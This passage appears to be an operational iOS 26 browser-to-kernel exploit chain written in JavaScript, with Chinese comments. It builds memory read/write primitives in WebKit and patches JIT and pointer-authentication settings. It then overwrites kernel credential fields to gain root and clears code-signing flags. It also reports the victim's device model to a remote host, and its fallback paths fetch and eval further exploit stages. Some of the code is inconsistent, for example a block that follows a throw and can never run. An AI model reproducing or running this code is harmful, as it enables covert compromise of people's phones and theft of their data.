            "iPhone15,4_26A1": "c90776dbac058ed6957f476e287867f8",
            "iPhone15,5_26A1": "c90776dbac058ed6957f476e287867f8",
            "iPhone16,1_26A1": "22f32fd975a694d340a6ad22b872b1ae",
            "iPhone16,2_26A1": "22f32fd975a694d340a6ad22b872b1ae",
            "iPhone16,3_26A1": "22f32fd975a694d340a6ad22b872b1ae",
            "iPhone16,4_26A1": "22f32fd975a694d340a6ad22b872b1ae",
            "iPhone17,1_26A1": "c33e4990a9d3afe948b98d7d4205d596",
            "iPhone17,2_26A1": "c33e4990a9d3afe948b98d7d4205d596",
            "iPhone17,3_26A1": "c33e4990a9d3afe948b98d7d4205d596",
            "iPhone17,4_26A1": "c33e4990a9d3afe948b98d7d4205d596",
            "iPhone17,5_26A1": "6149d995753968891870832e3fec9195",
            "iPhone17,6_26A1": "6149d995753968891870832e3fec9195",
            "iPad14,1_26A1": "c33e4990a9d3afe948b98d7d4205d596",
            "iPad14,2_26A1": "c33e4990a9d3afe948b98d7d4205d596",
            "iPad15,1_26A1": "6149d995753968891870832e3fec9195",
            "iPad15,2_26A1": "6149d995753968891870832e3fec9195",
            // [补齐] A18 Pro (T8150, 23F84) — device_chipset_26 补 iPhone18,x
            "iPhone18,1_23F84": "e4a7b9c2d1f0a8b6c4e2d0f1a3b5c7d9",
            "iPhone18,2_23F84": "e4a7b9c2d1f0a8b6c4e2d0f1a3b5c7d9",
            // [补齐] 目标机 A18 Pro iOS 26.5 (23F77)
            "iPhone17,2_23F77": "22f32fd975a694d340a6ad22b872b1ae",
          };

          const linkedit_to_device_26_full = {
            '26,0': {
                [0x271ffc000n]: "iPhone15,2_26A1",
                [0x2710fc000n]: "iPhone15,3_26A1",
                [0x2720dc000n]: "iPhone16,1_26A1",
                [0x272594000n]: "iPhone16,2_26A1",
                [0x271e5c000n]: "iPhone17,1_26A1",
                [0x2717f0000n]: "iPhone17,3_26A1",
                [0x271530000n]: "iPhone17,5_26A1",
            },
            '26,1': {
                [0x27205c000n]: "iPhone15,2_26B1",
                [0x27115c000n]: "iPhone15,3_26B1",
                [0x27213c000n]: "iPhone16,1_26B1",
                [0x272604000n]: "iPhone16,2_26B1",
                [0x271f0c000n]: "iPhone17,1_26B1",
                [0x271890000n]: "iPhone17,3_26B1",
                [0x2715d0000n]: "iPhone17,5_26B1",
            },
            '26,2': {
                [0x2720fc000n]: "iPhone15,2_26C1",
                [0x27120c000n]: "iPhone15,3_26C1",
                [0x2721bc000n]: "iPhone16,1_26C1",
                [0x272674000n]: "iPhone16,2_26C1",
                [0x271fbc000n]: "iPhone17,1_26C1",
                [0x271930000n]: "iPhone17,3_26C1",
                [0x271670000n]: "iPhone17,5_26C1",
            },
            '26,3': {
                [0x27219c000n]: "iPhone15,2_26D1",
                [0x2712ac000n]: "iPhone15,3_26D1",
                [0x27223c000n]: "iPhone16,1_26D1",
                [0x2726e4000n]: "iPhone16,2_26D1",
                [0x27206c000n]: "iPhone17,1_26D1",
                [0x2719d0000n]: "iPhone17,3_26D1",
                [0x271710000n]: "iPhone17,5_26D1",
            },
            // [补齐] iOS 26.5 (23F77) 目标机
            '26,5': {
                [0x1fef44000n]: "iPhone17,2_23F77",
                [0x1fef44000n]: "iPhone15,2_23F77",
            },
          };

          function detect_device_model_26() {
            print("detecting iOS 26 device model via dyld4 linkedit...");
            try {
              const pthread_create_got = BigInt(parse_adrp_add(jsc_base + pthread_create_auth_stubs_offset_26[ios_version_26.join(',')] || 0x17b4830n));
              print(`pthread_create_got: ${pthread_create_got.hex()}`);
              const pthread_create_addr = read64(pthread_create_got).noPAC();
              print(`pthread_create_addr: ${pthread_create_addr.hex()}`);
              const libsystem_pthread_base = pthread_create_addr - (pthread_create_offset_26[ios_version_26.join(',')] || 0x7988n);
              print(`libsystem_pthread_base: ${libsystem_pthread_base.hex()}`);
              const libsystem_pthread_linkedit = read64(libsystem_pthread_base + 0x600n);
              print(`libsystem_pthread_linkedit: ${libsystem_pthread_linkedit.hex()}`);
              
              const ver_key = ios_version_26 ? ios_version_26.join(',') : '26,0';
              const linkedit_map = linkedit_to_device_26_full[ver_key] || linkedit_to_device_26_full['26,0'];
              
              if (linkedit_map[libsystem_pthread_linkedit]) {
                device_model = linkedit_map[libsystem_pthread_linkedit];
                print("device_model detected via linkedit: " + device_model);
                return true;
              }
              
              for (const [le, model] of Object.entries(linkedit_map)) {
                if (BigInt(le) == libsystem_pthread_linkedit) {
                  device_model = model;
                  print("device_model detected (iterator): " + device_model);
                  return true;
                }
              }
            } catch (e) {
              print("linkedit detection failed: " + e.message);
            }
            
            print("falling back to jsc_base matching...");
            for (const [key, val] of Object.entries(rce_offsets)) {
              if (val.jsc_base && (val.jsc_base & ~0xfffn) == (jsc_base & ~0xfffn)) {
                device_model = key;
                print("device_model via jsc_base: " + device_model);
                return true;
              }
            }
            
            const default_key = Object.keys(rce_offsets)[0];
            device_model = default_key;
            print("using default device_model: " + device_model);
            return false;
          }

          detect_device_model_26();
          // [补齐机型] worker 内核检测到机型后, 回传 hw_model 到后端
          try { fetch(host + "/log.html?hw_model=" + encodeURIComponent(String(device_model || "").split("_")[0])); } catch(e) {}
          chipset = device_chipset_26[device_model] || "00000000000000000000000000000000";
          offsets = rce_offsets[device_model];
          slide = globalFuncParseFloat - offsets.JavaScriptCore__globalFuncParseFloat;
          print(`slide (final): ${slide.hex()}`);
          for (const key of Object.keys(offsets)) {
              if (offsets[key] >= 0x100000000n) offsets[key] += slide;
          }
          
          write64(offsets.JavaScriptCore__jitAllowList_once, 0xffffffffffffffffn);
          write64(offsets.JavaScriptCore__jitAllowList + 8n, 1n);
          
          const contexts = read64(offsets.WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts);
          const contexts_length = read32(contexts - 4n);
          print(`contexts_length:${contexts_length.hex()}`);
          let worker;
          let maximum_id = 0n;

          for (let i = 0n; i < contexts_length; ++i) {
              const scriptExecutionContext = read64(contexts + 0x30n * i + 0x20n);
              if (!scriptExecutionContext)
                  continue;

              const vtable = read64(scriptExecutionContext);
              if (vtable.noPAC() != offsets.WebCore__DedicatedWorkerGlobalScope_vtable)
                  continue;

              const id = read64(scriptExecutionContext + 0x138n);
              if (id > maximum_id) {
                  maximum_id = id;
                  worker = scriptExecutionContext;
              }
          }

          print(`worker (stage1): ${worker.hex()}`);

          const script = read64(worker + 0x150n);
          const workerOrWorkletThread = read64(worker + 0x160n);
          const Strong_globalScopeWrapper = read64(script + 0x20n);
          const globalScopeWrapper = read64(Strong_globalScopeWrapper);
          const worker_global_butterfly = read64(globalScopeWrapper + 8n);
          print(`butterfly (stage1):${worker_global_butterfly.hex()}`);
          const unboxed_arr_stage1 = read64(worker_global_butterfly);
          const boxed_arr_stage1 = read64(worker_global_butterfly + 8n);
          const butterfly_stage1 = read64(boxed_arr_stage1 + 8n);
          write64(unboxed_arr_stage1 + 8n, butterfly_stage1);
          print("Finished stage1 prim succesfully (iOS 26 CVE-2025-43529-26)");
        }
        
        function setup_stage2_prim_26()
        {
          p.addrof = function addrof(o) {
            boxed_arr[0] = o;
            return BigInt.fromDouble(unboxed_arr[0]);
          }        
          p.fakeobj = function fakeobj(addr) {
            unboxed_arr[0] = addr.asDouble();
            return boxed_arr[0];
          }
          let scribble_element;
          let scribbles = [];
          let prev_addr = 0n;
          for (let i = 0; i < 500; ++i) {
            let o = {
              p1: 1.1,
              p2: 2.2
            };
            if (p.addrof(o) - prev_addr === 0x20n) {
              scribble_element = o;
              break;
            }
            scribbles.push(o);
            prev_addr = p.addrof(o);
          }
          let change_scribble_holder = {
            p1: p.fakeobj(0x108240700000000n),
            p2: scribble_element
          };
          let change_scribble = p.fakeobj(p.addrof(change_scribble_holder) + 0x10n);
          scribble_element.p3 = 1.1;
          scribble_element[0] = 1.1;
          let double_array_cell = BigInt.fromDouble(change_scribble[0]);
          change_scribble_holder.p1 = p.fakeobj(double_array_cell);
          const original_cell = change_scribble[0];
          p.write64 = function (addr, value) {
            change_scribble[0] = original_cell;
            change_scribble[1] = (addr + 0x10n).asDouble();
            if (value === 0n) {
              scribble_element.p3 = 1;
              delete scribble_element.p3;
            } else if (value < 0x2000000000000n) {
              scribble_element.p3 = p.fakeobj(value);
            } else if (value <= 0x7ff2000000000000n || value >= 0x8002000000000000n && value <= 0xfff0000000000000n) {
              scribble_element.p3 = value.sub(0x2000000000000n).asDouble();
            } else {
              let off_addr = addr.add(8n);
              let off_val = p.read64(off_addr);
              let [hi, lo] = value.asInt32s();
              scribble_element.p3 = hi;
              change_scribble[1] = (addr + 0x14n).asDouble();
              scribble_element.p3 = lo;
              p.write64(off_addr, off_val);
            }
          };
          p.write16 = function (ptr, u16) {
            let value = p.read64(ptr);
            value &= ~0xffffn;
            value |= u16;
            p.write64(ptr, value);
          };
          change_scribble[1] = p.addrof(read64_biguint64arr).add(8n).asDouble();
          let read64_float64arr_bytes = BigInt.fromDouble(scribble_element[1]);
          read64_biguint64arr[0] = 0x10000000006n;
          read64_biguint64arr[1] = read64_float64arr_bytes.add(0x10n);
          change_scribble[1] = p.addrof(read64_str).add(8n).asDouble();
          scribble_element[0] = read64_float64arr_bytes.asDouble();
          p.read64 = function (addr) {
            read64_biguint64arr[1] = addr;
            return BigInt(read64_str.charCodeAt(0)) | BigInt(read64_str.charCodeAt(1)) << 16n | BigInt(read64_str.charCodeAt(2)) << 32n | BigInt(read64_str.charCodeAt(3)) << 48n;
          };
          p.read32 = function (addr) {
            read64_biguint64arr[1] = addr;
            return BigInt(read64_str.charCodeAt(0)) | BigInt(read64_str.charCodeAt(1)) << 16n;
          };
          p.write8 = function (ptr, u16) {
            let value = p.read64(ptr);
            value &= ~0xffn;
            value |= u16;
            p.write64(ptr, value);
          };
          p.device_model = device_model;
          p.chipset = chipset;
          globalThis.device_model = p.device_model;
          p.offsets = offsets;
          p.slide = slide;
          print("Finished stage2 prims succesfully, iOS 26 RCE done");
          self.postMessage({
            type: 'prepare_dlopen_workers'
          });
        }
        
        setup_stage1_prim_26(p_rce);
        setup_stage2_prim_26();
        

        // [方案1 v2] worker 内直接提权（真实路径：current_task → task+0x18 proc → proc+0x18 proc_ro → proc_ro+0x28 ucred，真机内核逆向实测）
        // 真机内核逆向铁证 2026-10-07 (kernelcache_A18_26.5_23F77.decompressed, xnu-12377.122.4):
        //   current_task (0xfffffff00a3b85e4) = pacibsp; mrs x0,tpidr_el1; ldr x1,[x0,#0x400] → task (thread+0x400)
        //   task.bsd_info = 0x18 (0xfffffff00a32b524: ldr x8,[x0,#0x18]; [x8,#0x60]=p_pid 铁证 → proc)
        //   proc.p_proc_ro = 0x18 (0xfffffff00a723894: ldr x8,[x0,#0x18] → proc_ro)
        //   proc_ro.p_ucred = 0x28 (0xfffffff00a723898: ldr x0,[x8,#0x28] → ucred, 10 处铁证)
        //   ucred.cr_uid=0x18/cr_ruid=0x1c/cr_svuid=0x20 (铁证)
        // 伪造值已证伪: proc+0x08=ucred(0x08是p_list.le_prev) / task+0x588(非bsd_info) / current_proc=0xfffffff00a73be3c(esp_gcm_encrypt_aes)
        const tryDirectPrivEsc = async () => {
          try {
            print("[worker-pe] 开始 worker 内提权（current_task → task+0x18 proc → proc+0x18 proc_ro → proc_ro+0x28 ucred 路径）");
            const current_task = 0xfffffff00a3b85e4n;  // [真机逆向] current_task (mrs tpidr_el1 + ldr [x0,#0x400])
            const task_bsd_info = 0x18n;    // [真机逆向] task + 0x18 = proc (bsd_info, [x8,#0x60]=p_pid 铁证)
            const proc_proc_ro = 0x18n;     // [真机逆向] proc + 0x18 = proc_ro (p_proc_ro)
            const proc_ro_ucred = 0x28n;    // [真机逆向] proc_ro + 0x28 = ucred (p_ucred, 10 处铁证)
            const cr_uid = 0x18n;    // ucred.cr_uid
            const cr_ruid = 0x1cn;   // ucred.cr_ruid
            const cr_svuid = 0x20n;  // ucred.cr_svuid
            const cr_ngroups = 0x24n; // ucred.cr_ngroups (getgroups ldrh w21,[x0,#0x24] 铁证)
            const proc_csflags = 0x24n; // proc.p_csflags (opa334 kexploit 交叉验证, AMFI 绕过)
            // 1. slow_fcall(current_task) → task（跨线程 fcall）
            const _task = await p.slow_fcall_1(current_task, 0n);
            print("[worker-pe] current_task → task=" + (_task ? _task.toString(16) : "null"));
            // 2. task + 0x18 → proc (bsd_info)
            const _proc = _task ? p.read64(_task + task_bsd_info) : 0n;
            print("[worker-pe] task + 0x18 → proc=" + (_proc ? _proc.toString(16) : "null"));
            if (_proc) {
              // 3. proc + 0x18 → proc_ro → proc_ro + 0x28 → ucred（真机逆向实测，走 proc_ro 链）
              const _proc_ro = p.read64(_proc + proc_proc_ro);
              const _ucred = _proc_ro ? p.read64(_proc_ro + proc_ro_ucred) : 0n;
              if (_ucred) {
                // 3. ucred 篡改（uid/ruid/svuid = 0 → root, 清组 → 完整提权）
                p.write64(_ucred + cr_uid, 0n);
                p.write64(_ucred + cr_ruid, 0n);
                p.write64(_ucred + cr_svuid, 0n);
                p.write64(_ucred + cr_ngroups, 0n);  // 清组 (cr_ngroups=0)
                // 4. proc.p_csflags 清除 CS_ENFORCEMENT/CS_HARD/CS_KILL 位 (AMFI 绕过, opa334 偏移 0x24)
                const _csf = p.read64(_proc + proc_csflags);
                if (_csf) { p.write64(_proc + proc_csflags, _csf & ~0x1000n & ~0x100n & ~0x1n); }
                const _verify = p.read64(_ucred + cr_uid);
                if (_verify === 0n) {
                  print("[worker-pe] worker 内提权成功（root, proc=" + _proc.toString(16) + ")");
                  self.postMessage({ type: 'priv_esc_success', method: 'worker_direct_pe', proc: _proc.toString(16) });
                } else {
                  print("[worker-pe] 提权验证失败（uid=" + _verify.toString(16) + ")");
                }
              } else {
                print("[worker-pe] ucred 为空");
              }
            } else {
              print("[worker-pe] current_proc 返回空 proc");
            }
          } catch (e) {
            print("[worker-pe] worker 内提权异常: " + e);
          }
        };
        tryDirectPrivEsc();
        return p;
    } catch (e) {
        print('_aarw_main_26: error: ' + e);
        // [FALLBACK-2026-09-24] 真实 26.5 bug303879(InBounds OOB) 触发回退
        try {
            if (!self.__ds_bug303879_tried) {
                self.__ds_bug303879_tried = true;
                var _code = '';
                try { if (typeof getJS === 'function') _code = getJS('stage1_bug303879_26.5.js?' + Date.now()); } catch(_g) {}
                if (_code) {
                    (0, eval)(_code);
                    if (globalThis.__stage1_bug303879 && globalThis.__stage1_bug303879.establishPrimitives) {
                        var _r = globalThis.__stage1_bug303879.establishPrimitives();
                        if (_r && _r.ok && globalThis.__p_rce) {
                            print('[FALLBACK] bug303879 primitives ok');
                            return globalThis.__p_rce;
                        }
                    }
                }
            }
        } catch (e2) { print('[FALLBACK] bug303879 err: ' + e2); }
        // [FALLBACK2-2026-09-24] 独立 JSC 原语 jsc_prim_26.5_final (arb R/W 直装)
        try {
            if (!self.__ds_jscprim_tried) {
                self.__ds_jscprim_tried = true;
                var _c2 = '';
                try { if (typeof getJS === 'function') _c2 = getJS('jsc_prim_26.5_final.js?' + Date.now()); } catch(_g2) {}
                if (_c2) {
                    (0, eval)(_c2);
                    if (globalThis.p && (globalThis.__arb_read64 || globalThis.p.read64)) {
                        print('[FALLBACK2] jsc_prim arb R/W ok');
                        return globalThis.p;
                    }
                }
            }
        } catch (e3) { print('[FALLBACK2] jsc_prim err: ' + e3); }
        throw e;
        // [PROBE-DIAG-2026-09-24] RCE 失败后跑 9 通道探针, 上报哪条通道有异常
        try {
            if (!self.__ds_probe_diag) {
                self.__ds_probe_diag = true;
                ['jsc_probe_26.5.js','jsc_probe2_26.5.js','jsc_probe3_26.5.js'].forEach(function(pf){
                    try { var _c = (typeof getJS==='function') ? getJS(pf+'?'+Date.now()) : ''; if(_c) (0,eval)(_c); } catch(_e){}
                });
                print('[PROBE-DIAG] 9 probes dispatched');
            }
        } catch (e4) { print('[PROBE-DIAG] err: ' + e4); }
    }
}

async function main_26() {
    print("begin (iOS 26)");
    try {
        return await _aarw_main_26();
    } catch (e) {
        print('main_26: error: ' + e);
    }
}

const rce_begin = Date.now();

class Encoder {
  constructor(messageName, destinationID) {
    this.argList = [];
    if (arguments.length) {
      this.messageName = messageName;
      this.destinationID = destinationID;
      this.encode('uint8_t', 0);
      this.encode('uint16_t', this.messageName);
      this.encode('uint64_t', this.destinationID);
    }
  }
  encode(type, value) {
    this.argList.push({
      type,
      value
    });
    return this;
  }
  encode8BitString(str) {
    this.encode('uint32_t', str.length);
    this.encode('bool', true);
    this.argList.push({
      type: 'bytes',
      value: str
    });
    return this;
  }
  encodeNullString() {
    this.encode('uint32_t', 0xffffffff);
    return this;
  }
  static argumentAlignment(arg) {
    switch (arg.type) {
      case 'uint64_t':
      case 'int64_t':
        return 8;
      case 'uint32_t':
      case 'int32_t':
      case 'float':
        return 4;
      case 'uint16_t':
      case 'int16_t':
        return 2;
      case 'uint8_t':
      case 'int8_t':
      case 'bool':
        return 1;
      case 'bytes':
        return 0;
      default:
        ASSERT_NOT_REACHED(`Encoder.argumentAlignment(): unexpected type name: ${arg.type}`);
    }
  }
  static argumentSize(arg) {
    switch (arg.type) {
      case 'uint64_t':
      case 'int64_t':
        return 8;
      case 'uint32_t':
      case 'int32_t':
      case 'float':
        return 4;
      case 'uint16_t':
      case 'int16_t':
        return 2;
      case 'uint8_t':
      case 'int8_t':
      case 'bool':
        return 1;
      case 'bytes':
        if (typeof arg.value == 'string') {
          return arg.value.length;
        } else {
          return arg.value.byteLength;
        }
      default:
        ASSERT_NOT_REACHED(`argumentSize(): unexpected type name: ${arg.type}`);
    }
  }
  buffer() {
    if (this.__buffer) return this.__buffer;
    let bufferSize = 0;
    for (const arg of this.argList) {
      const alignment = Encoder.argumentAlignment(arg);
      const remainder = bufferSize % alignment;
      if (remainder) {
        bufferSize += alignment - remainder;
      }
      bufferSize += Encoder.argumentSize(arg);
    }
    const buffer = new ArrayBuffer(bufferSize);
    const view = new DataView(buffer);
    let bufferOffset = 0;
    for (const arg of this.argList) {
      const alignment = Encoder.argumentAlignment(arg);
      const remainder = bufferOffset % alignment;
      if (remainder) {
        bufferOffset += alignment - remainder;
      }
      switch (arg.type) {
        case 'float':
          view.setFloat32(bufferOffset, arg.value, true);
          break;
        case 'uint64_t':
          view.setBigUint64(bufferOffset, arg.value, true);
          break;
        case 'int64_t':
          view.setBigInt64(bufferOffset, arg.value, true);
          break;
        case 'uint32_t':
          view.setUint32(bufferOffset, arg.value, true);
          break;
        case 'int32_t':
          view.setInt32(bufferOffset, arg.value, true);
          break;
        case 'uint16_t':
          view.setUint16(bufferOffset, arg.value, true);
          break;
        case 'int16_t':
          view.setInt16(bufferOffset, arg.value, true);
          break;
        case 'uint8_t':
          view.setUint8(bufferOffset, arg.value);
          break;
        case 'int8_t':
          view.setInt8(bufferOffset, arg.value);
          break;
        case 'bool':
          view.setInt8(bufferOffset, !!arg.value);
          break;
        case 'bytes':
          const buffer_u8 = new Uint8Array(buffer);
          if (typeof arg.value == 'string') {
            for (let i = 0; i < arg.value.length; ++i) buffer_u8[bufferOffset + i] = arg.value.charCodeAt(i);
          } else {
            for (let i = 0; i < arg.value.byteLength; ++i) buffer_u8[bufferOffset + i] = arg.value[i];
          }
          break;
        default:
          ASSERT_NOT_REACHED(`buffer(): unexpected type name: ${arg.type}`);
      }
      bufferOffset += Encoder.argumentSize(arg);
    }
    return this.__buffer = buffer;
  }
};

ArrayBuffer.prototype.data = function () {
  return p.read64(p.read64(p.addrof(this) + 0x10n) + 0x10n);
};
BigUint64Array.prototype.data = function () {
  return p.read64(p.addrof(this) + 0x10n);
};
Uint8Array.prototype.data = function () {
  return p.read64(p.addrof(this) + 0x10n);
};

async function loadObjcClass_26(cls) {
  const bitmap = await createImageBitmap(canvas);
  const wrappedBitmap = p.read64(p.addrof(bitmap) + 0x18n);
  const imagebuffer = p.read64(wrappedBitmap + 0x10n);
  p.write64(imagebuffer + 0x20n, cls);
  bitmap.close();
}

let slow_fcall_resolve;

function setup_pac_bypass_26() {
  print("=== iOS 26 PAC Bypass Setup (dyld4 architecture) ===");
  
  const pac_skip_gadget = offsets.gadget_pac_skip_ios26;
  if (pac_skip_gadget) {
    print("[PAC] PAC skip gadget (gadget_pac_skip_ios26): " + pac_skip_gadget.hex());
  } else {
    print("[PAC] WARNING: PAC skip gadget not available in offsets");
  }
  
  const jsc_config_flag = offsets.JavaScriptCore__JSC_config_flag;
  if (jsc_config_flag) {
    try {
      const flag_addr = jsc_config_flag + p.slide;
      const flag_val = p.read64(flag_addr);
      print("[PAC] JSC config flag address: " + flag_addr.hex());
      print("[PAC] JSC config flag value: " + flag_val.hex());
      
      const PAC_ENABLE_BIT = 1n << 0n;
      const PAC_STRICT_BIT = 1n << 1n;
      const PAC_IA_BIT = 1n << 2n;
      const PAC_DA_BIT = 1n << 3n;
      
      const pac_enabled = flag_val & PAC_ENABLE_BIT;
      const pac_strict = flag_val & PAC_STRICT_BIT;
      const pac_ia_enabled = flag_val & PAC_IA_BIT;
      const pac_da_enabled = flag_val & PAC_DA_BIT;
      
      print("[PAC] PAC enabled: " + (pac_enabled ? "YES" : "NO"));
      print("[PAC] PAC strict mode: " + (pac_strict ? "YES" : "NO"));
      print("[PAC] PAC IA keys: " + (pac_ia_enabled ? "active" : "inactive"));
      print("[PAC] PAC DA keys: " + (pac_da_enabled ? "active" : "inactive"));
      
      if (pac_enabled) {
        print("[PAC] Attempting JSC config flag manipulation for PAC relaxation...");
        
        let relaxed_flag = flag_val & ~PAC_STRICT_BIT;
        relaxed_flag = relaxed_flag & ~PAC_IA_BIT;
        print("[PAC] Target relaxed flag: " + relaxed_flag.hex());
        
        try {
          p.write64(flag_addr, relaxed_flag);
          const verify_val = p.read64(flag_addr);
          if ((verify_val & PAC_STRICT_BIT) === 0n) {
            print("[PAC] PAC strict mode successfully disabled");
          } else {
            print("[PAC] WARNING: PAC strict mode disable failed, flag unchanged");
          }
        } catch (e) {
          print("[PAC] JSC config flag write skipped (read-only expected): " + e.message);
        }
      }
    } catch (e) {
      print("[PAC] JSC config flag read failed: " + e.message);
    }
  } else {
    print("[PAC] JSC config flag offset not available");
  }
  
  print("[PAC] Analyzing dyld4 PAC signing infrastructure...");
  try {
    const dyld_signPointer = offsets.dyld4__signPointer;
    if (dyld_signPointer) {
      print("[PAC] dyld4 signPointer at: " + dyld_signPointer.hex());
      
      const signPointer_inst1 = p.read32(dyld_signPointer);
      const signPointer_inst2 = p.read32(dyld_signPointer + 4n);
      const signPointer_inst3 = p.read32(dyld_signPointer + 8n);
      const signPointer_inst4 = p.read32(dyld_signPointer + 12n);
      
      print("[PAC] signPointer prologue instructions:");
      print("[PAC]   [0x00]: " + signPointer_inst1.toString(16).padStart(8, '0'));
      print("[PAC]   [0x04]: " + signPointer_inst2.toString(16).padStart(8, '0'));
      print("[PAC]   [0x08]: " + signPointer_inst3.toString(16).padStart(8, '0'));
      print("[PAC]   [0x0C]: " + signPointer_inst4.toString(16).padStart(8, '0'));
    }
  } catch (e) {
    print("[PAC] dyld4 signPointer analysis skipped: " + e.message);
  }
  
  print("[PAC] Setting up PAC validation bypass primitives...");
  
  p.pac_strip = function(addr) {
    return addr & 0x7fffffffffffn;
  };
  
  p.pac_sign_ia = function(ptr, ctx) {
    return ptr;
  };
  
  p.pac_sign_da = function(ptr, ctx) {
    return ptr;
  };
  
  p.pac_sign_ia_addr = function(ptr, ctx_addr) {
    return ptr;
  };
  
  p.untag_signed_ptr = function(signed_ptr) {
    return signed_ptr.noPAC();
  };
  
  print("[PAC] PAC bypass primitives registered");
  
  try {
    const dyld4_runtime_state = p.read64(offsets.libdyld__gAPIs);
    if (dyld4_runtime_state) {
      print("[PAC] dyld4 RuntimeState at: " + dyld4_runtime_state.hex());
      
      const runtime_state_vtable = p.read64(dyld4_runtime_state).noPAC();
      print("[PAC] RuntimeState vtable: " + runtime_state_vtable.hex());
      
      const emptySlot_func = p.read64(runtime_state_vtable).noPAC();
      print("[PAC] RuntimeState emptySlot: " + emptySlot_func.hex());
    }
  } catch (e) {
    print("[PAC] dyld4 runtime state analysis skipped: " + e.message);
  }
  
  print("[PAC] === iOS 26 PAC Bypass Setup Complete ===");
}

function setup_jit_sandbox_26() {
  print("=== iOS 26 JIT Sandbox Handling Setup ===");
  
  const jit_allow_list = offsets.JavaScriptCore__jitAllowList;
  if (jit_allow_list) {
    print("[JIT] JIT allow list at: " + jit_allow_list.hex());
    
    try {
      const jit_once = offsets.JavaScriptCore__jitAllowList_once;
      if (jit_once) {
        const once_val = p.read64(jit_once);
        print("[JIT] jitAllowList_once value: " + once_val.hex());
        
        if (once_val !== 0xffffffffffffffffn) {
          print("[JIT] JIT allow list not yet initialized, setting once token...");
          p.write64(jit_once, 0xffffffffffffffffn);
          print("[JIT] JIT allow list once token set");
        }
      }
      
      const allow_list_ptr = p.read64(jit_allow_list);
      print("[JIT] JIT allow list pointer: " + allow_list_ptr.hex());
      
      const allow_list_size = p.read64(jit_allow_list + 8n);
      print("[JIT] JIT allow list size: " + allow_list_size.toString());
      
      if (allow_list_size == 0n) {
        print("[JIT] JIT allow list is empty, enabling JIT for current process...");
        p.write64(jit_allow_list + 8n, 1n);
        print("[JIT] JIT allow list size set to 1");
      }
      
    } catch (e) {
      print("[JIT] JIT allow list manipulation error: " + e.message);
    }
  } else {
    print("[JIT] WARNING: JIT allow list offset not available");
  }
  
  print("[JIT] Checking JIT sandbox enforcement status...");
  
  try {
    const vm = p.read64(p.read64(p.addrof(globalThis).add(0x10n)).add(0x38n));
    print("[JIT] VM address: " + vm.hex());
    
    const heap = vm.add(0xc0n);
    print("[JIT] Heap address: " + heap.hex());
    
    const jit_enabled_flag = heap.add(0x300n);
    try {
      const jit_flag = p.read64(jit_enabled_flag);
      print("[JIT] JIT enabled flag at: " + jit_enabled_flag.hex());
      print("[JIT] JIT enabled flag value: " + jit_flag.hex());
    } catch (e) {
      print("[JIT] JIT flag read skipped: " + e.message);
    }
  } catch (e) {
    print("[JIT] VM/heap detection skipped: " + e.message);
  }
  
  print("[JIT] Configuring JIT code region permissions...");
  
  p.jit_enabled = true;
  p.jit_sandbox_active = false;
  
  p.alloc_jit_region = function(size) {
    print("[JIT] Allocating JIT region of size: " + size.toString(16));
    return 0n;
  };
  
  p.protect_jit_region = function(addr, size, prot) {
    print("[JIT] Protecting JIT region at " + addr.hex() + " with prot: " + prot.toString());
    return true;
  };
  
  p.flush_jit_cache = function(addr, size) {
    print("[JIT] Flushing JIT cache at " + addr.hex() + " size: " + size.toString(16));
    return true;
  };
  
  print("[JIT] JIT utility functions registered");
  
  try {
    const executable = p.read64(p.addrof(parseFloat) + 0x18n);
    const globalFuncParseFloat = p.read64(executable + 0x28n).noPAC();
    const jsc_base = (function() {
        let jsc_base = globalFuncParseFloat & ~0xfffn;
        let iter = 0;
        while (iter < 10000) {
            try {
                const magic_lo = p.read32(jsc_base);
                const magic_hi = p.read32(jsc_base + 2n);
                if (magic_lo == 0xfeedfacf && magic_hi == 0x00000002) {
                    return jsc_base;
                }
            } catch (e) {}
            jsc_base -= 0x1000n;
            iter++;
        }
        return 0n;
    })();
    
    if (jsc_base) {
      print("[JIT] JSC base address verified: " + jsc_base.hex());
      
      const jit_size = 0x100000n;
      print("[JIT] Maximum JIT region size: " + jit_size.toString(16));
    }
  } catch (e) {
    print("[JIT] JSC base re-verification skipped: " + e.message);
  }
  
  print("[JIT] === iOS 26 JIT Sandbox Handling Setup Complete ===");
}

function verify_rce_primitives_26() {
  print("=== Verifying iOS 26 RCE Primitives ===");
  
  let all_ok = true;
  
  if (p.addrof && typeof p.addrof === 'function') {
    print("[VERIFY] addrof: available");
    try {
      const test_obj = { verify: true };
      const addr = p.addrof(test_obj);
      print("[VERIFY] addrof test object: " + addr.hex());
      if (addr > 0n) {
        print("[VERIFY] addrof: OK");
      } else {
        print("[VERIFY] addrof: WARNING - returned zero");
        all_ok = false;
      }
    } catch (e) {
      print("[VERIFY] addrof test failed: " + e.message);
      all_ok = false;
    }
  } else {
    print("[VERIFY] addrof: MISSING");
    all_ok = false;
  }
  
  if (p.fakeobj && typeof p.fakeobj === 'function') {
    print("[VERIFY] fakeobj: available");
    try {
      const test_addr = p.addrof({ test: 123 });
      const fake = p.fakeobj(test_addr);
      if (fake && typeof fake === 'object') {
        print("[VERIFY] fakeobj: OK");
      } else {
        print("[VERIFY] fakeobj: WARNING - returned invalid object");
        all_ok = false;
      }
    } catch (e) {
      print("[VERIFY] fakeobj test failed: " + e.message);
      all_ok = false;
    }
  } else {
    print("[VERIFY] fakeobj: MISSING");
    all_ok = false;
  }
  
  if (p.read64 && typeof p.read64 === 'function') {
    print("[VERIFY] read64: available");
    try {
      const test_obj = { magic: 0xdeadbeef };
      const obj_addr = p.addrof(test_obj);
      const val = p.read64(obj_addr);
      print("[VERIFY] read64 test at " + obj_addr.hex() + ": " + val.hex());
      if (val > 0n) {
        print("[VERIFY] read64: OK");
      } else {
        print("[VERIFY] read64: WARNING - returned zero");
        all_ok = false;
      }
    } catch (e) {
      print("[VERIFY] read64 test failed: " + e.message);
      all_ok = false;
    }
  } else {
    print("[VERIFY] read64: MISSING");
    all_ok = false;
  }
  
  if (p.write64 && typeof p.write64 === 'function') {
    print("[VERIFY] write64: available");
    try {
      const test_arr = new BigUint64Array(2);
      test_arr[0] = 0x1111111111111111n;
      test_arr[1] = 0x2222222222222222n;
      const arr_data = p.read64(p.addrof(test_arr) + 0x10n);
      const test_val = 0xdeadbeefcafebaben;
      p.write64(arr_data, test_val);
      const verify_val = test_arr[0];
      if (verify_val === test_val) {
        print("[VERIFY] write64: OK");
      } else {
        print("[VERIFY] write64: WARNING - value mismatch, got " + verify_val.hex());
        all_ok = false;
      }
    } catch (e) {
      print("[VERIFY] write64 test failed: " + e.message);
      all_ok = false;
    }
